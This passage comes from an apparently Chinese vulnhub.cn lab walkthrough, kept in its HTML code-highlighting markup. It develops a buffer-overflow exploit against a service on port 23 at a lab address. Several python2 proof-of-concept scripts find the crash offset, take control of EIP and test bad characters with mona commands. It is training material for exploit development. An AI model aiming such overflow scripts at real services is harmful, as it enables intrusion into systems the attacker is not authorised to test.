+</span></span><span style=display:flex><span><span style=color:#00688b>buff</span> += <span style=color:#cd5555>&#34;Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>nullByte</span> = <span style=color:#cd5555>&#34;\x00&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>inputBuffer</span> = buff 
+</span></span><span style=display:flex><span><span style=color:#00688b>s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span><span style=display:flex><span>s.close()
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/613/7.webp alt=7></p><p><img src=https://www.vulnhub.cn/walkthrough/613/8.webp alt=8></p><p>看来长度是1902</p><h3 id=poc3py>poc3.py</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#1e889b>#!/usr/bin/python2
+</span></span></span><span style=display:flex><span><span style=color:#1e889b></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span><span style=color:#00688b>ip</span> = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>port</span> = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>buff</span> = <span style=color:#cd5555>&#34;A&#34;</span>*1898
+</span></span><span style=display:flex><span><span style=color:#00688b>eip</span> = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>buffer</span> = <span style=color:#cd5555>&#34;C&#34;</span> * <span style=color:#b452cd>24</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>inputBuffer</span> = buff + eip + buffer 
+</span></span><span style=display:flex><span><span style=color:#00688b>s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span><span style=display:flex><span>s.close()
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/613/9.webp alt=9></p><h3 id=poc4py>poc4.py</h3><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#1e889b>#!/usr/bin/python2
+</span></span></span><span style=display:flex><span><span style=color:#1e889b></span>import socket
+</span></span><span style=display:flex><span>import sys
+</span></span><span style=display:flex><span>import os
+</span></span><span style=display:flex><span><span style=color:#00688b>ip</span> = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>port</span> = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>buff</span> = <span style=color:#cd5555>&#34;A&#34;</span>*1902
+</span></span><span style=display:flex><span><span style=color:#00688b>eip</span> = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span><span style=color:#00688b>buffer</span> = <span style=color:#cd5555>&#34;C&#34;</span> * (2500-len(buff) - len(eip))
+</span></span><span style=display:flex><span><span style=color:#00688b>inputBuffer</span> = buff + eip + buffer 
+</span></span><span style=display:flex><span><span style=color:#00688b>s</span> = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://www.vulnhub.cn/walkthrough/613/10.webp alt=10></p><h3 id=poc5py>poc5.py</h3><p>反复测试坏字符</p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>!mona bytearray -cpb <span style=color:#cd5555>\x</span><span style=color:#b452cd>00</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/11.webp alt=11></p><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>!mona bytearray -cpb <span style=color:#cd5555>\x</span>00<span style=color:#cd5555>\x</span>4d
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span style=color:#cd5555>&#34;</span>)
+</span></span><span style=display:flex><span>buff = <span style=color:#cd5555>&#34;A&#34;</span>*<span style=color:#b452cd>1902</span>
+</span></span><span style=display:flex><span>eip = <span style=color:#cd5555>&#34;B&#34;</span> * <span style=color:#b452cd>4</span>
+</span></span><span style=display:flex><span>buffer = badchars
+</span></span><span style=display:flex><span>nullByte = <span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x00</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span>inputBuffer = buff + eip + buffer + nullByte
+</span></span><span style=display:flex><span>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+</span></span><span style=display:flex><span>s.connect((ip, port))
+</span></span><span style=display:flex><span>s.send(inputBuffer)
+</span></span></code></pre></td></tr></table></div></div><p>再次执行<code>!mona compare -a esp -f "D:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin"</code></p><p><img src=https://www.vulnhub.cn/walkthrough/613/12.webp alt=12></p><pre tabindex=0><code>!mona bytearray -cpb \x00\x4d\x4f
+</code></pre><div class=highlight><div style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#228b22>#!/usr/bin/python2</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>socket</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>sys</span>
+</span></span><span style=display:flex><span><span style=color:#8b008b;font-weight:700>import</span> <span style=color:#008b45;text-decoration:underline>os</span>
+</span></span><span style=display:flex><span>ip = <span style=color:#cd5555>&#34;10.0.2.14&#34;</span>
+</span></span><span style=display:flex><span>port = <span style=color:#b452cd>23</span>
+</span></span><span style=display:flex><span>badchars = (<span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span style=color:#cd5555>&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#cd5555>&#34;</span><span style=color:#cd5555>\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span style=color:#cd5555>&#34;</span>
